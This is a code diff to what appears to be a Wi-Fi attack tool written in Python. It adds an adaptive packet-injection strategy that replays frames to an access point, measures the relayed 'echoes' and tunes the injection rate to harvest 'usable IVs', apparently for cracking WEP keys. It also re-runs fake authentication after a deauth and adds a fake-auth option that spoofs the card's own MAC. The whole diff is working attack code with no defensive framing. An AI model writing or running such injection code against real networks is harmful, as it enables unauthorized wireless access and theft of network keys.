@@ -263,6 +263,71 @@ async def run(iface, args, bssid: bytes) -> int:
         return 2
 
     drv = iface.driver
+    if args.generate and args.strategy == "adaptive":
+        # Climb-with-peak-memory: push the per-window inject count UP while echoes keep rising,
+        # remember the best (echo_rate, target), and settle back to it once going higher stops
+        # helping; re-probe occasionally. Handles both regimes with no fixed duty/pps:
+        #   - below the AP's relay ceiling (slow/hard-MAC): echoes rise with inject, so it climbs to
+        #     all-gas (target outgrows the card's burst -> the burst can't finish -> no sleep).
+        #   - ceiling-limited (fast cards): echoes drop past the knee, so it snaps back to the peak.
+        # Window is 2s (> the AP's ~1-2s relay lag) so a measurement isn't smeared across the burst.
+        window = 2.0
+        grow = 1.25
+        target = 100.0                      # kickstart injects/window
+        best_echo, best_target = 0.0, target
+        ewma, misses, since_probe = -1.0, 0, 0
+        climbing = True
+        print(f"\n[Phase C] GENERATE {args.generate:g}s: strategy=adaptive climb "
+              f"(window={window:g}s, grow={grow:g})")
+        start = time.time()
+        end = start + args.generate
+        tap.reset()
+        total_inj = 0
+        last_report = start
+        while time.time() < end:
+            cyc = time.time()
+            echoes_before = tap.echoes
+            sent = 0
+            while sent < int(target) and time.time() < end and (time.time() - cyc) < 2 * window:
+                await iface.send_no_wait(frame)
+                sent += 1
+                total_inj += 1
+            if tap.deauth_to_us:
+                print("  deauthed -> re-associating")
+                tap.deauth_to_us = 0
+                await fake_auth(iface, tap, bssid, our_mac, args.essid, args.active_monitor)
+            rest = window - (time.time() - cyc)
+            if rest > 0:
+                await asyncio.sleep(rest)               # listen: RX airtime for the echoes
+            wdur = max(1e-3, time.time() - cyc)
+            echo_rate = (tap.echoes - echoes_before) / wdur
+            ewma = echo_rate if ewma < 0 else 0.5 * echo_rate + 0.5 * ewma
+            since_probe += 1
+            if climbing:
+                if ewma > best_echo * 1.03:            # higher helped -> remember + keep climbing
+                    best_echo, best_target, misses = ewma, target, 0
+                    target *= grow
+                else:
+                    misses += 1                        # no gain; tolerate one lagged window
+                    if misses >= 2:
+                        target, climbing, misses, since_probe = best_target, False, 0, 0
+                    else:
+                        target *= grow
+            else:
+                target = best_target                   # hold at the peak
+                if since_probe >= 8:                   # re-probe the ceiling every ~16s
+                    climbing, since_probe = True, 0
+            target = max(20.0, min(target, best_target * 4 + 200))
+            if time.time() - last_report >= 4.0:
+                last_report = time.time()
+                print(f"  [{'climb' if climbing else 'hold '}] target={target:.0f}/win "
+                      f"echo={echo_rate:.0f}/s best={best_echo:.0f}@{best_target:.0f} "
+                      f"usable_IVs={len(tap.echo_ivs)}")
+        dur = time.time() - start
+        print(f"  DONE(adaptive): injected={total_inj} ({total_inj / dur:.0f}/s)  "
+              f"usable IVs={len(tap.echo_ivs)} ({len(tap.echo_ivs) / dur:.0f}/s)  "
+              f"best={best_echo:.0f}/s @ target {best_target:.0f}/win")
+        return 0
     if args.generate:
         duty = max(0.0, min(1.0, args.duty))
         print(f"\n[Phase C] GENERATE {args.generate:g}s: duty={duty:g} "
@@ -335,7 +400,11 @@ async def main() -> int:
     ap.add_argument("--duty", type=float, default=1.0,
                     help="TX duty cycle in --generate: inject duty*window, sleep the rest (1.0 = AGNB)")
     ap.add_argument("--window", type=float, default=1.0,
-                    help="duty-cycle window length in seconds (default 1.0)")
+                    help="duty-cycle / adaptive window length in seconds (default 1.0)")
+    ap.add_argument("--strategy", choices=["duty", "adaptive"], default="duty",
+                    help="--generate strategy: fixed --duty, or adaptive (pace to measured echo rate)")
+    ap.add_argument("--headroom", type=float, default=1.2,
+                    help="adaptive: next-window inject count = echo_rate * window * headroom")
     ap.add_argument("--own-mac", action="store_true",
                     help="fake-auth as the card's own MAC (FIXED_MAC cards only HW-ACK that)")
     ap.add_argument("--card", type=str, default="", help="adapter substring (default: first found)")
